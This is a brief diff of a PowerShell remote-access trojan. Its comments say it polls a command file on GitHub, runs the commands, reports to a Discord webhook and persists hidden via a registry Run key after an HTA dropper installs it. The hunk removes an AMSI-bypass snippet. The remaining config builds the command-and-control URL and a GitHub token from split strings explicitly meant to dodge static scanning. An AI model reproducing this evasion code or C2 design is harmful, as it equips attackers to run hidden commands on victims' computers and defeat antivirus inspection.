@@ -2,10 +2,6 @@
 # Polls a command file on GitHub raw, executes, reports to a Discord webhook.
 # Deployed by the comicstreams HTA (runs hidden, survives via registry Run key).
 
-# ---- AMSI bypass (amsiContext null) ----
-$R=[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
-$R.GetField('ams'+'iContext','NonPublic,Static').SetValue($R,$null)
-
 # ---- Config (strings split to dodge static scanning) ----
 $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
 $T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
